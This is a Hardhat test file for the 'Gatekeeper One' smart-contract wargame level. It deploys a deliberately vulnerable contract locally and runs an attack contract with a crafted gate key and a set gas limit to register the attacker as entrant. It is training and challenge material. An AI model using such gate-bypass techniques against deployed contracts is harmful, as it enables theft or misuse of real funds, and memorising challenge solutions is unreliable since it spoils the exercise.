const { ethers } = require("hardhat");
const { expect } = require("chai");

/*

Make it past the gatekeeper and register as an entrant to pass this level.

Things that might help:
- Remember what you've learned from the Telephone and Token levels.
- You can learn more about the special function gasleft(), in Solidity's documentation (see here and here).

*/

describe("[Challenge] Gatekeeper One", function () {
  let deployer, attacker;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    this.gatekeeperOne = await (
      await ethers.getContractFactory("GatekeeperOne", deployer)
    ).deploy();
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */
    this.gatekeeperOneAttack = await (
      await ethers.getContractFactory("GatekeeperOneAttack", attacker)
    ).deploy(this.gatekeeperOne.address);

    const _gateKey =
      "0x" +
      "111122220000" +
      attacker.address.substring(
        attacker.address.length - 4,
        attacker.address.length
      );

    await this.gatekeeperOneAttack.connect(attacker).attack(_gateKey, {
      gasLimit: 2e7,
    });
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    const entrant = await this.gatekeeperOne.entrant();
    expect(entrant).to.eq(attacker.address);
  });
});
